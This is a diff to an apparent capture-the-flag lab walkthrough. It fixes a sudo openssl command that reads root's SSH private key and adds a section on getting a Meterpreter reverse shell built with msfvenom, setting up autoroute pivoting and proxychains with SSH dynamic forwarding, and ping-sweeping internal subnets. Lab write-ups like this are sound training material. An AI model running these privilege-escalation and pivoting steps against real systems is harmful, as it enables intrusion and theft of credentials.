@@ -309,7 +309,7 @@ sudo /usr/bin/openssl enc -in $LFILE
 The first declares the LFILE variable as the ssh private key id_rsa under the root directory. 
 The second exploits the openssl sudo privilege to encrypt the ssh private key with "-in $LFILE" to use the file path specified by the environment variable $LFILE. 
 ```
-sudo /usr/bin/opensll enc -in /root/.ssh/id_rsa
+sudo /usr/bin/openssl enc -in /root/.ssh/id_rsa
 ```
 Not sure if it is necessary to call the LFILE variable, as the command above also works in retrieving the private key. Now we can use the SSH private key to authenticate as root:
 ```
@@ -320,9 +320,57 @@ Now we can browse to the /root directory and concatenate the Thirteenth flag:
 a34985b5976072c3c148abc751671302
 ```
 ### Fourteenth Flag:
-Just for convenience, I have set root's password to 123 with the passwd command. 
+Since we have root access on the machine, we can now focus in pivoting to other networks. 
+We do netstat -r and notice that we are on three subnets: 10.129.0.0/16, 172.16.0.0/16, 172.17.0.0/16, and 172.18.0.0/16. We use msfvenom to generate a .elf reverse shell script for DMZ01 using the following command:
+```
+sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(localip) LPORT=(localport) -f elf > shell.elf
+```
+We then use scp to transfer this shell.elf file to DMZ01:
+```
+sudo scp -i id_rsa shell.elf root@(ip)
+```
+After that's done, we go into msfconsole and use multi/handler to set up a reverse shell listener. 
+```
+USE multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST (ip)
+set LPORT (port)
+run
+```
+Then run ./shell.elf as root on DMZ01 to get the reverse shell.
 
+Once that's done, background the meterpreter session you get on msfconsole and then use post/multi/manage/autoroute, set session and subnet, and run. 
+```
+[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
+[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
+[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
+[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
+```
+You can then check routes with the "route" command on msfconsole.
 
+Next we setup proxychains for firewall evasion:
+```
+sudo apt-install proxychains
+vim /etc/proxychains.conf
+socks4  127.0.0.1 9050
+```
+Then use dynamic port forwarding to ssh to DMZ01 to utilize the proxychains servers.
+```
+ssh -D 9050 -i id_rsa root@(ip)
+```
+We can also test if proxychains is working by testing a proxychains nmap scan, be careful because proxychain nmap scans may only work with the subcommands -Pn to prevent pinging the target as officially proxychains does not support ICMP, only TCP, and -sT for TCP connect scanning. 
+```
+proxychains nmap -sT -Pn (ip)
+```
+After verifying proxychains is working, we create a new shell.elf file but this time making the local port 9050, which is the port for the proxychains servers. We then use multi/handler to create a TCP listener on msfconsole and execute the shell.elf file on DMZ1. After getting meterpreter, we background the session and use multi/gather/ping_sweep and use the subnet 172.16.0.0/16 172.17.0.0/16 172.18.0.0/16 as the RHOSTS as well as set the meterpreter session number. 
+We then run the ping sweep and wait patiently for it to return hosts:
+```
+[*] Performing ping sweep for IP range 172.16.0.0/16
+[+] 	172.16.8.3 host found
+[+] 	172.16.8.20 host found
+[+] 	172.16.8.50 host found
+[+] 	172.16.8.120 host found
+```
 
 
 
